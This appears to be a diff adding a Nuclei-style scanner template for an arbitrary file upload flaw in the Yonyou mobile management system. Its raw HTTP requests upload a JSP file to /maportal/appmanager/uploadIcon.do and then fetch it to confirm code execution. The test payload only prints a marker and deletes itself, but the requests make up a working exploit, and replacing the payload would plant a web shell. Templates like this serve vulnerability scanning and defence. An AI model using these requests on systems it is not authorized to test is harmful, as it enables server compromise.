@@ -1,0 +1,44 @@
+id: yonyou-uploadicon-do-fileupload
+info:
+  name: yonyou-uploadicon-do-fileupload
+  author: apple
+  severity: critical
+  description: 用友移动管理系统 /maportal/appmanager/uploadIcon.do、/mobsm/common/upload等接口存在任意文件上传漏洞，未经授权攻击者通过漏洞上传任意文件，最终可以获取服务器权限。
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485034&idx=1&sn=a2c1f085ca37f6b3a36fa22b395b5767&chksm=974b8b6da03c027bf60ea2c3a7980f2516cd0c347144cd047fe0c2835b922702336bf8755791&scene=21#wechat_redirect
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+  
+http:
+  - raw:
+      - |-
+        POST /maportal/appmanager/uploadIcon.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 183
+        Content-Type: multipart/form-data; boundary=b4e8eb7e0392a9158c610b1875784406
+
+        --b4e8eb7e0392a9158c610b1875784406
+        Content-Disposition: form-data; name="iconFile"; filename="{{filename}}.jsp"
+
+        <% out.println("whoisceshi");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        --b4e8eb7e0392a9158c610b1875784406--
+      - |+
+        GET /maupload/img/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'whoisceshi'
